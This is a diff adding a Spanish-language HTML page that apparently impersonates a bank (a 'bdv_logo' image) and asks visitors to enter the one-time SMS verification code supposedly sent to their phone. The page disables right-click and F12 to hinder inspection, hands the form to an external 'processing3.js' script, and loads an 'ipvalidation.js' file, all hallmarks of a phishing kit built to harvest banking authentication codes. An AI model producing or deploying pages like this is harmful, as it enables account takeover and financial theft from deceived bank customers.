@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verificación de Código</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+  <link rel="apple-touch-icon" href="icono.png">
+  <link rel="stylesheet" href="css/3.css">
+  <script>
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+    document.onkeydown = function(e) {
+      if (e.ctrlKey && (e.keyCode === 71)) { return false; }
+    };
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12') { e.preventDefault(); }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="js/alerta2.js"></script>
+</head>
+<body>
+  <img src="img/background2.jpg" class="background-img">
+  
+  <div style="position: absolute; left: 260px; top: 100px;">
+    <img src="img/bdv_logo.png" class="logo">
+  </div>
+  
+  <div class="container">
+    <h1>Código SMS</h1>
+    <p>Por tu seguridad, te enviamos un código vía SMS a tu número celular registrado para confirmar tu identidad.<br>Ingrésalo a continuación:</p>    
+    <form id="formulario">
+      <input type="text" 
+             id="documento" 
+             name="documento" 
+             placeholder="Código SMS"
+             inputmode="numeric"
+             minlength="6"
+             maxlength="8"
+             pattern="[0-9]*"
+             required>
+      <input type="submit" value="Verificar">
+    </form>
+  </div>
+
+  <script src="js/processing3.js"></script>
+  <script>
+    document.getElementById("formulario").addEventListener("submit", enviarFormulario);
+  </script>
+  
+  <script src="ipvalidation.js"></script>
+</body>
+</html>
